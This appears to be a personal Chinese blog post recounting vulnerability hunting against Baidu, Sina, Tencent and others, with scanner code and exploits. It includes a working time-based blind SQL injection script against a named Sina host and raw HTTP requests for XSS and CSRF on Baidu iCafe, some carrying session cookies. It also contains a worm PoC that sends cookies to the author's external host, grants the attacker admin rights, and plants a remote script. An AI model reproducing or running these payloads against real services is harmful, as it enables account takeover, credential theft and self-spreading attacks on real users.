---
title: 漏洞总结
date: 2017-09-19 09:38:04
tags: 个人
password: "wo de offer ne?"
---
### 曾经挖掘过的漏洞(百度，腾讯，爱奇艺，新浪等等)
#### 注入大类
##### 扫描器简述
1. 通过tornado被动代理(未入库)
```python
#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = 'T1m0n'


import urlparse
import tornado.web
import tornado.ioloop
import tornado.iostream
import tornado.httpclient
import tornado.httputil
import tornado.httpserver


def proxy_prase(porxy):
    proxy_prased = urlparse.urlparse(porxy, scheme='http')
    return proxy_prased.hostname, proxy_prased.port


def fetch_request(url, callback, **kwargs):
    # print url
    req = tornado.httpclient.HTTPRequest(url, **kwargs)
    client = tornado.httpclient.AsyncHTTPClient()
    client.fetch(req, callback, raise_error=False)


class ProxyHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ('GET', 'POST')

    def compute_etag(self):
        return None

    @tornado.web.asynchronous
    def get(self):
        def handle_response(response):
            if response.error and not isinstance(response.error, tornado.httpclient.HTTPError):
                self.set_status(500)
                self.write('Internal server error:%s' % str(response.error))
            else:
                self.set_status(response.code, response.reason)
                self._headers = tornado.httputil.HTTPHeaders()
                for header, v in response.headers.get_all():
                    if header not in ('Content-Length', 'Transfer-Encoding', 'Content-Encoding', 'Connection'):
                        self.add_header(header, v)
                if response.body:
                    self.set_header('Content-Length', len(response.body))
                    self.write(response.body)
            self.finish()
        body = self.request.body
        if not body:
            body = None
        try:
            if 'Proxy-Connection' in self.request.headers:
                del self.request.headers['Proxy-Connection']
            fetch_request(
                self.request.uri,
                handle_response,
                method=self.request.method,
                body=body,
                headers=self.request.headers,
                follow_redirects=False,
                allow_nonstandard_methods=True,
            )
        except tornado.httpclient.HTTPError as e:
            # log
            if hasattr(e, 'response') and e.response:
                handle_response(e.response)
            else:
                self.set_status(500)
                self.write('Internal server error:%s' % str(e))
                self.finish()


    @tornado.web.asynchronous
    def post(self, *args, **kwargs):
        return self.get()


if __name__ == '__main__':
    port = 8080
    app = tornado.web.Application([
        (r'.*', ProxyHandler),
    ])
    app.listen(port)
    ioloop = tornado.ioloop.IOLoop.instance().start()
```
2. 任务调度(修改过)
```python
class Scheduler(object):
    def __init__(self, interval=5):
        self.interval = interval
        self.conn = connect()

    def _get_task(self):
        task_id = None
        task_info = None
        # tasks = self.collection.find({'status' : 0}).sort("_id", pymongo.ASCENDING).limit(1)
        task = self.conn.query('select * from capture where static_resource = 0 and is_check =0', fetchone=True)
        if task:
            url = task.get('url')
            task_id = task.get('id')
            domain = task.get('host')
            method = task.get('method')
            request_data = task.get('content')
            header = json.loads(task.get('header'))
            user_agent = header.get('User-Agent')
            cookies = header.get('Cookie')
            task_info = dict(
                task_id=task_id,
                url=url,
                domain=domain,
                method=method,
                request_data=request_data,
                user_agent=user_agent,
                cookies=cookies
            )

            print("task_id : %s, \ntask_info:") % task_id
            pprint(task_info)
            return task_id, task_info
        return None,None

    # set task checking now
    def _set_checking(self, task_id):
        # self.collection.update({'_id': ObjectId(task_id)}, {"$set" : {'status' : 1}})
        self.conn.update('capture', {'is_check': 1}, {'id': task_id})

    # set task checked
    def _set_checked(self, task_id):
        # self.collection.update({'_id': ObjectId(task_id)}, {"$set" : {'status' : 2}})
        self.conn.update('capture', {'is_check': 2}, {'id': task_id})

    # distribution task
    def distribution_task(self):
        task_id, task_info = self._get_task()
        print "get scan task done, sleep %s second." % self.interval
        if task_id is not None:
            self._set_checking(task_id)
            url = task_info.get('url')
            domain = task_info.get('domain')
            method = task_info.get('method')
            request_data = task_info.get('request_data')
            user_agent = task_info.get('user_agent')
            cookies = task_info.get('cookies')
            scan.apply_async((task_id, url, domain, method, request_data, user_agent, cookies,))

            # self._set_checking(task_id)

    def run(self):
        while True:
            self.distribution_task()
            time.sleep(self.interval)

```
2. 导入aranic进行扫描
```python
#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = 'T1m0n'

import os
import time
import hashlib
import threading
import subprocess
from urlparse import urlparse

from arachni_config import *


# Arachni rpc clint scan class
class Arachni_Console(object):
    def __init__(self, url, method='GET', http_agent="TSCAN", cookies="", request_data="", page_limit=5):
        self.start_time = str(time.time())
        # self.dispatcher_url     = "--dispatcher-url=%s" % dispatcher_url
        self.url = url
        self.report = "%s_%s" % (urlparse(url).netloc, hashlib.md5(self.start_time).hexdigest())
        self.limit = page_limit
        self.page_limit = "--scope-page-limit=%s" % self.limit
        self.report_file = "--report-save-path=/tmp/%s.afr" % self.report
        self.http_agent = http_agent
        self.cookies = cookies
        self.audit = "--audit-links"
        self.h_agent = "--http-user-agent=%s" % (self.http_agent)
        self.h_cookies = "--http-cookie-string=%s" % (self.cookies)
        self.checks = ARACHNI_CHECK
        # self.checks = "--checks=rfi,code_injection_timing,directory_listing,sql_injection,sql_injection_timing,sql_injection_differential,source_code_disclosure,file_inclusion,xss,xss_tag,path_traversal,os_cmd_injection_timing,"
        self.timeout = "--timeout=%s" % "2:30:00"
        self.arachni_client = ARACHNI_CLIENT
        self.arachni_reporter = ARACHNI_REPORTER
        self.is_timeout = False
        self.proc = None
        self.report_jsfile = '/tmp/%s.json' % self.report
        self.request_data = request_data
        self.post_yamlfile = '/tmp/' + url + hashlib.md5(self.start_time).hexdigest() + ".yml"
        self.post_pluginscan = '--plugin=vector_feed:yaml_file=' + self.post_yamlfile
        self.method = method
        self.result = None

    # Start to Scan
    def _Scan(self):
        # subprocess command
        if self.method == 'POST':
            self.gen_yaml()
            self.cmd = [
                self.arachni_client,
                self.h_agent,
                self.h_cookies,
                self.audit,
                self.checks,
                self.post_pluginscan,
                self.page_limit,
                self.timeout,
                self.report_file,
                # self.dispatcher_url,
                self.url
            ]

        else:
            self.cmd = [
                self.arachni_client,
                self.h_agent,
                self.h_cookies,
                self.audit,
                self.checks,
                self.page_limit,
                self.timeout,
                self.report_file,
                # self.dispatcher_url,
                self.url
            ]
        if self.cookies:
            self.cmd.insert(2, self.h_cookies)

        if self.limit:
            self.cmd.insert(3, self.page_limit)

        print self.cmd
        self.timer = threading.Timer(60 * 10, self.set_time_out())
        self.timer.start()

        self.proc = subprocess.Popen(self.cmd)

        self.proc.wait()
        self.timer.cancel()
        print self.proc.poll()
        print self.proc.pid

    # timeout function
    def set_time_out(self):
        if self.proc is not None:
            self.is_timeout = True
            self.timer.cancel()
            self.proc.kill()

            # Yaml file generated by scanning http POST method request

    def gen_yaml(self):
        # PostFP='/tmp/'+url+hashlib.md5(self.start_time).hexdigest()+".yml"
        fp = open(self.post_yamlfile, 'w')
        fp.write("type:form")
        fp.write("method:post")
        fp.write("action:" + self.url)
        fp.write("inputs:")
        aa = ["\t" + i.replace("=", ":") for i in self.request_data.split("\&")]
        fp.write(aa)
        fp.close()

    def get_report(self):
        # arachni_reporter /tmp/test.afr --report=json:outfile=/tmp/test.json
        try:
            self._Scan()
            self._report()
        except Exception, e:
            pass
            # raise e

        return self.result

    # get result, format is json
    def _report(self):
        self.cmd = [
            self.arachni_reporter,
            "/tmp/%s.afr" % self.report,
            '--report=json:outfile=%s' % self.report_jsfile
        ]
        print self.cmd
        self.proc = subprocess.Popen(self.cmd)
        self.proc.wait()
        print self.report_jsfile
        self.result = open(self.report_jsfile).read()
        # del report files
        os.remove(self.report)
        os.remove(self.report_jsfile)


# Main function
if __name__ == '__main__':
    pass
    dispatcher_url = "127.0.0.1:7331"
    all_domains = dict()
    domains = [
        "http://192.168.40.132/dvwa/",
    ]

    for domain in domains:
        arachni_console = Arachni_Console(domain, http_agent='a',
                                          cookies='security=low; PHPSESSID=b86de7f57bd6a04709a9facd52dbdda1')
        result = arachni_console.get_report()
        print result

```
##### 漏洞挖掘方式
1. 设置手机http代理 *.*.*.*:2333
2. 欢快的上网

##### 漏洞
1. 百度外卖sql注入
2. 百度优客注入
3. 爱奇艺1k500w数据
4. 新浪注入
自行构建脚本
```python
#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = 'T1m0n'
import httplib, time
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'User-Agent': 'Mozilla/5.0(WindowsNT6.3;Win64;x64;rv:44.0) Gecko / 20100101Firefox / 44.0',
    'Host': 'weidealer.auto.sina.com.cn',
    'Content-Type': 'application/x-www-form-urlencoded',
}
user = ''
payloads = 'abcdefghijklmnopqrstuvwxyz1234567890.@_'
i = 100
for x in range(1, 24):
    for payload in payloads:
        conn = httplib.HTTPConnection('weidealer.auto.sina.com.cn', 80)
        url = '/new/index.php/api/xunjia/AjaxAskPrice'
        start_time = time.time()
        number = '138345%05d' % i
        body = 'info[mobile]=' + number + '&info[province_id]=11&info[city_id]=1&info[brand_id]=95&info[sub_brand_id]=1661&info[car_id]=18058 AND (SELECT * FROM (SELECT'
        body += '(if(ascii(substr(user(),%d,1))=%d,sleep(5),1)' % (x, ord(payload))
        body += '))zkHd)-- mGEC&info[xname]=false&info[ask_reffer]=67'
        conn.request('POST', url, body, headers)
        res = conn.getresponse().read()
        conn.close()
        print '.',
        i += 1
        if time.time() - start_time > 5:
            print payload
            user += payload
            break
print user
```

***
#### xss + csrf

## 0x00 XSS
发现百度icafé 有一个存储型XSS
新建一个项目，然后新建计划
名字那里有个xss 只有标题输出时过滤了
```http
POST /planAndTrack/planBox/save HTTP/1.1
Host: cafe.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://cafe.baidu.com/planAndTrack/space/aaa3123ae/?planBoxId=&containSubBox=false&maxRecords=50&q=&currentPage=1
Content-Length: 170
Cookie: Hm_lvt_664446bf6103d14238545dd03f9d2e65=1504422613,1504678632,1504678710,1504765324; icafeuid=Zmt3YW5nbGVtaW1hQDE2My5jb206MTUwNTg4ODI1NDM4MzpiZjNhODhkMDA1ODg0Y2E3NWExZDIzYmFmZDkyM2JmZQ; space-last-visit-component=20279%23plan%2C20226%23plan%2C20280%23plan%2C20288%23plan; space-last-planBoxId=20226%2378326; BAIDUID=27A4C872A1168DFA75B3324BF10BC6D9:FG=1; BIDUPSID=2209196EE1A2B1C7A3DB02847E2A0A6B; PSTM=1504750661; H_PS_PSSID=1461_21078_22159; MsessionId=B0FFE46B6E6B2873BCE8F91ACA8F79F2.worker2; Hm_lpvt_664446bf6103d14238545dd03f9d2e65=1504772107; cookieissuefields_20279=%5Btype%5D%5Bstatus%5D%5Bowner%5D%5BcreateTime%5D; cookieissuefields_20288=%5Btype%5D%5Bstatus%5D%5Bowner%5D%5BcreateTime%5D
Connection: close

spaceId=20288&name="><img/src=1 onerror=alert(document.cookie)>&startDateStr=2017-08-30&endDateStr=2017-09-28&parentId=&desc=&changeAlter=&alterReceiver=&includeChildren=

```
只有bduss设置了httponly的属性
也就是说，我们现在只要去项目里面发送一个邀请，等他点一下。就能拿到被邀请人的icafé的cafeid了
这里可以搞了机具有诱惑力的连接去钓鱼。

## 0x01 CSRF
也是新建计划这里 直接不要refer就能新建
```http
POST /planAndTrack/planBox/save HTTP/1.1
Host: cafe.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://cafe.baidu.com/planAndTrack/space/1234567890/?planBoxId=&containSubBox=false
Content-Length: 135
Cookie:  icafeuid=Zmt3YW5nbGVtaW1hQDE2My5jb206MTUwNTk4MzMzNTM0MTplYmNlMzE4ZjIxMGI5NzM2MDc4NjIwMWRjMmI0MGVhOA; PSINO=5
Connection: close

spaceId=20280&name=111&startDateStr=2017-09-07&endDateStr=2017-09-12&parentId=&desc=dasdas&changeAlter=&alterReceiver=&includeChildren=
```
又是一个CSRF，增加管理员，这里在邮箱后面增加|104就是管理员
```http
POST /user/invite/inviteGroupUsers HTTP/1.1
Host: cafe.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 58
Cookie:  icafeuid=Zmt3YW5nbGVtaW1hQDE2My5jb206MTUwNTk4MzMzNTM0MTplYmNlMzE4ZjIxMGI5NzM2MDc4NjIwMWRjMmI0MGVhOA; PSINO=5
Connection: close

spaceId=20280&inviteEmails=fkwanglemima%40126.com%7C104%3B
```

## 0x02 利用
思路：可以构造成一个蠕虫
1.	发送邮件，加入项目组，(拿到cookie)。
2.	访问自己最近的一个项目拿到id，CSRF增加一个计划
3.	在admin频道增加一个我的垃圾小号admin的权限，也就是我能看很多的icafe的项目了
4.	从最近的联系人的列表里面抓下来用户列表，发送只读权限的到邮箱

这样 我就能看到基本上全部人的icafe的项目了
由于bduss 的权限是 .baidu.com的
同样这个漏洞可以找到bduss的泄露点去顺便X到budss

## 0x03 poc 编写
首先发现一个可以得到当前用户的全部项目的链接
http://cafe.baidu.com/spaceTre
里面有我们构造payload所需要的id
```javascript
var website="http://t1m00n.tk/***";(function(){(new Image()).src=website+'/?keepsession=1&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();function add_admin(id){$.ajax({type:"POST",url:"http://cafe.baidu.com/user/invite/inviteGroupUsers",data:"spaceId="+id+"&inviteEmails=fkwanglemima%40163.com%7C104%3B",success:function(data){},error:function(){}});}function add_payload(id){$.ajax({type:"POST",url:"http://cafe.baidu.com/planAndTrack/planBox/save",data:'spaceId='+id+'&name=%22%3E%3Cscript%20src%3D%22http%3A%2f%2ft1m00n.tk%2fveryug11y%2fBlueLotus_XSSReceiver%2fmyjs%2fa.js%22%3E%3C%2fscript%3E&startDateStr=2017-08-30&endDateStr=2017-09-28&parentId=&desc=&changeAlter=&alterReceiver=&includeChildren=',success:function(data){},error:function(){}});}function exp(){$.getJSON('http://cafe.baidu.com/spaceTree',function(data){$.each(data,function(key,value){add_admin(value.id);add_payload(value.id);})});}exp();
```

# 第二弹 修复
## 0x04 CSRF的修复（加了csrftoken?）
1.	Csrftoken 没用 可重用 有的可以不填
增加管理员部分
```http
POST /user/invite/inviteGroupUsers HTTP/1.1
Host: cafe.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Cookie:  icafeuid=Zmt3YW5nbGVtaW1hQHNpbmEuY29tOjE1MDYwMDgzNjUxMzk6MDY2MGIzYTBkNTk3OGYwMTI4ODBjNTY1ZDM5ZDExOGM;
Connection: close

spaceId=20300&inviteEmails=fkwanglemima%40sina.com.cn%7C105%3B

```

2. 增加时间表部分：
```http
POST /planAndTrack/planBox/save HTTP/1.1
Host: cafe.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 152
Cookie:  icafeuid=Zmt3YW5nbGVtaW1hQHNpbmEuY29tOjE1MDYwMDgzNjUxMzk6MDY2MGIzYTBkNTk3OGYwMTI4ODBjNTY1ZDM5ZDExOGM;
Connection: close

csrfToken=&spaceId=20300&name=2333&startDateStr=2017-08-30&endDateStr=2017-09-
01&parentId=78667&desc=123123&changeAlter=&alterReceiver=&includeChildren=

```

## 0x05 XSS的修复(基本没有修复)
1.	删的时候也会xss
2. 选到任务里, 点一下track xss

## 0x06 利用2
其他都一样，这次js代码里面吧MsessionId变成空就行了
这次是两个存储型XSS
随便选一个利用
照样是蠕虫

Poc和上次差不多，这次只要去掉不加双引号就行


# 总结
 2015-2016年主要依靠扫描器被动扫描对一些大厂app，web等进行扫描，发现很多sql注入漏洞。注入利用简单(SQLMAP)危害大。但是后来waf部署后漏洞较难挖掘。
    前端相关的漏洞更值得关注。如xss，csrf等一些漏洞的集合，可能会导致各种神奇的问题。如蠕虫，有甚至是xss打内网等等。


# 腾讯某高危漏洞描述

遵照渗透测试流程，首先进行信息收集
腾讯全部的域名，二级域名
    1. [dns.io](https://dnsdb.io/zh-cn/)
    2. google https 证书
    3. dns爆破
    4. git
针对部分域名对应的ip端进行端口扫描(想探测http代理，socket代理等可以直接打入内网)
发现存在acl

git发现一个腾讯内部pac代理的域名
扫描过程发现一个443端口为某腾讯旗下微信平台的后台，不存在密码，随意登录
且查询地方存在sql注入点

# 总结
虽然企业存在acl，对web应用做反向代理等等。可是还是存在一些漏网之鱼，可能会被渗透入内网。
对策：增加边界网络的排查力度，天天定时扫描
# 反思
1. 企业资产很大 --- > 开发扫描器 --> 收集企业资产
2. 漏洞利用不彻底。当时存在设置cron表达式，应该可以命令执行，接着漫游内网
3. acl可以控制部分端口，但是对具体端口开放应用的内容没有进行扫描或者是识别很弱
